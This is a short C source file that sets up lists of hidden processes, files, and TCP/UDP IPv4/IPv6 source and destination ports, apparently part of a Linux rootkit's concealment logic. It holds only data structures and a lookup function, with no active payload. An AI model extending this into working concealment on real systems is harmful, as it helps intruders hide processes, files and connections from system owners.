/* logic */
#include "list_hidden.h"

// procs and files hidden lists
LIST_HEAD(L_HPROC);
LIST_HEAD(L_HFILE);

// udp4 hidden lists , s = src, d = dest
LIST_HEAD(L_HU4_PORT_S);
LIST_HEAD(L_HU4_PORT_D);

// udp6 hidden lists
LIST_HEAD(L_HU6_PORT_S);
LIST_HEAD(L_HU6_PORT_D);

// tcp4 hidden lists
LIST_HEAD(L_HT4_PORT_S);
LIST_HEAD(L_HT4_PORT_D);

// tcp6 hidden lists
LIST_HEAD(L_HT6_PORT_S);
LIST_HEAD(L_HT6_PORT_D);

static void *list_hidden_head[] = {
        (void *)(&L_HPROC),
        (void *)(&L_HFILE),

        // ports
        (void *)(&L_HU4_PORT_S),
        (void *)(&L_HU4_PORT_D),

        (void *)(&L_HU6_PORT_S),
        (void *)(&L_HU6_PORT_D),

        (void *)(&L_HT4_PORT_S),
        (void *)(&L_HT4_PORT_D),

        (void *)(&L_HT6_PORT_S),
        (void *)(&L_HT6_PORT_D),
};

void *list_hidden_get_head(const list_hidden_e list_hidden)
{
        return list_hidden_head[list_hidden];
}

